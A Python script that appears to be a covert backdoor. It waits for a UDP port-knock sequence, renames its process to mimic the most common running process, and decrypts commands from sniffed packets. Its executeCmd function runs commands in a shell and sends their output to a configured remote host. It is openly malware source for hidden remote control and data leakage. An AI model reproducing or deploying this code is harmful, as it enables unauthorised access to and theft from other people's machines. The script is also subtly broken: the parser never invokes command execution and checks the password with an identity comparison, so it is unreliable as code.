#/usr/bin/python

# pip install scapy
# dnf install redhat-rpm-config
# Unzip the setproctitle file by:
# tar -xvzf setproctitle-1.1.10.tar.gz
# Go to setproctitle directory and type:
# python setup.py install
import socket, os, sys, time, logging
from scapy.all import *
import setproctitle
import config
import encryption
import netifaces

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
code = 0
localIP = config.localIP
localPort = config.localPort
remoteIP = config.remoteIP
remotePort = config.remotePort
protocol = config.protocol


def portKnocking(packet):
    global code
    global attackerIP
    ports = config.portKnocks
    if IP in packet:
        if UDP in packet:
            srcAddr = packet[IP].src
            srcPort = packet[UDP].sport
            if srcPort == ports[0] and code == 0:
                code = 1
                print("{} : Knock 1".format(srcAddr))
            elif srcPort == ports[1] and code == 1:
                code = 2
                print("{} : Knock 2".format(srcAddr))
            elif srcPort == ports[2] and code == 2:
                code = 3
                attackerIP = srcAddr
                print("{}: Knock 3. Authetication succeed.".format(srcAddr))
            else:
                print("Authetication failed. Wrong sequence...")

def sendPacket(data):
    if protocol.upper() == 'TCP':
        packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=data)
    elif protocol.upper() == 'UDP':
        packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=data)
    send(packet, verbose=True)

def executeCmd(packet, cmd):
    print("Executing command: {}".format(cmd))
    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = result.stdout.read() + result.stderr.read()
    print("Result: %s" % result)
    sendPacket(result)
    time.sleep(0.1)

def parsePacket(packet):
    payload = packet[protocol].payload.load
    payload = encryption.decrypt(payload)

    if payload == "":
        return
    password = payload[:8]
    cmd = payload[8:]

    if password is not config.password:
        return


def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def maskProcess():
    # Get the most common process for ps command
    cmd = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    cmdResult = cmd.read()
    setproctitle.setproctitle(cmdResult)
    print("Most common process for ps command: {}".format(cmdResult))

def is_incoming(packet):
    """
    Check if packets are incoming or outgoing.
    """
    # Get the default hardware interface
    defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']

    return packet[Ether].src != hardwareAddr

def main():
    maskProcess()
    checkRootPrivilege()
    mFilter = protocol + " and src host " + remoteIP + " and dst port " + str(localPort) + \
            " and src port " + str(remotePort)
    while code != 3:
        sniff(filter="udp and dst port {}".format(config.listenPort), prn=portKnocking, count=1)
    while True:
        sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)

if __name__ == '__main__':
    main()
